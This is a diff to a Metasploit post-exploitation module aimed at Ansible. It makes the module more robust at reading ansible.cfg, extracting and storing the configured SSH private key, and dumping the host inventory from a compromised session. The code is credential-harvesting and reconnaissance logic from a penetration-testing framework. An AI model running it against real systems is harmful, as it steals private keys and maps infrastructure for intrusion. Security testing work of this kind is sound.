@@ -75,7 +75,7 @@ class MetasploitModule < Msf::Post
   end
 
   def ping_hosts_print
-    results = ping_hosts
+    results = ping_hosts(datastore['HOSTS'])
     if results.nil?
       print_error('Unable to parse ping hosts results')
       return
@@ -91,40 +91,63 @@ class MetasploitModule < Msf::Post
   end
 
   def conf
-    unless file?(ansible_cfg)
+    config_path = ansible_cfg
+    unless config_path && file?(config_path)
       print_bad('Unable to find config file')
       return
     end
 
-    ansible_config = read_file(ansible_cfg)
+    ansible_config = read_file(config_path)
+    unless ansible_config
+      print_warning("Unable to read Ansible config file: #{config_path}")
+      return
+    end
+
     stored_config = store_loot('ansible.cfg', 'text/plain', session, ansible_config, 'ansible.cfg', 'Ansible config file')
     print_good("Stored config to: #{stored_config}")
-    ansible_config.lines.each do |line|
-      next unless line.start_with?('private_key_file')
+    settings = Rex::Parser::Ini.from_s(ansible_config).fetch('defaults', {})
+    private_key = settings.find { |name, _value| name.strip == 'private_key_file' }
+    return unless private_key
 
-      file = line.split(' = ')[1].strip
-      next unless file?(file)
+    file = private_key.last.strip
+    return unless file?(file)
 
-      print_good("Private key file location: #{file}")
-
-      key = read_file(file)
-      loot = store_loot('ansible.private.key', 'text/plain', session, key, 'private.key', 'Ansible private key')
-      print_good("Stored private key file to: #{loot}")
+    print_good("Private key file location: #{file}")
+    unless readable?(file)
+      print_warning("Private key file is not readable: #{file}")
+      return
     end
+
+    key = read_file(file)
+    unless key
+      print_warning("Unable to read private key file: #{file}")
+      return
+    end
+
+    loot = store_loot('ansible.private.key', 'text/plain', session, key, 'private.key', 'Ansible private key')
+    print_good("Stored private key file to: #{loot}")
   end
 
   def hosts_list
     hosts = cmd_exec("#{ansible_inventory} --list")
     hosts = JSON.parse(hosts)
-    inventory = store_loot('ansible.inventory', 'application/json', session, hosts, 'ansible_inventory.json', 'Ansible inventory')
+    metadata = hosts.is_a?(Hash) ? hosts['_meta'] : nil
+    hostvars = metadata.is_a?(Hash) ? metadata['hostvars'] : nil
+    unless hostvars.is_a?(Hash) && hostvars.values.all? { |entry| entry.is_a?(Hash) }
+      fail_with(Failure::UnexpectedReply, 'Ansible inventory did not return a valid host-variable map')
+    end
+
+    inventory = store_loot('ansible.inventory', 'application/json', session, JSON.generate(hosts), 'ansible_inventory.json', 'Ansible inventory')
     print_good("Stored inventory to: #{inventory}")
     columns = ['Host', 'Connection']
     table = Rex::Text::Table.new('Header' => 'Ansible Hosts', 'Indent' => 1, 'Columns' => columns)
-    hosts = hosts.dig('_meta', 'hostvars')
-    hosts.each do |host|
+    hostvars.each do |host|
       table << [host[0], host[1]['ansible_connection']]
     end
     print_good(table.to_s) unless table.rows.empty?
+  rescue JSON::ParserError => e
+    elog('Unable to parse Ansible inventory output', error: e)
+    fail_with(Failure::UnexpectedReply, 'Unable to parse Ansible inventory output')
   end
 
   def run
